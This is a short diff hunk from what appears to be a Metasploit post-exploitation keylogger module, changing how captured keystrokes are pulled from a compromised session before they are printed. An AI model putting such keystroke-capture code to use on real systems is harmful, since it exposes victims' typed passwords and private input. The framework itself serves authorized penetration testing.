@@ -243,7 +243,7 @@ class MetasploitModule < Msf::Post
   #
   # @return [void] A useful return value is not expected here
   def write_keylog_data
-    output = session.ui.keyscan_extract(session.ui.keyscan_dump)
+    output = session.ui.keyscan_dump
 
     if not output.empty?
       print_good("Keystrokes captured #{output}") if datastore['ShowKeystrokes']
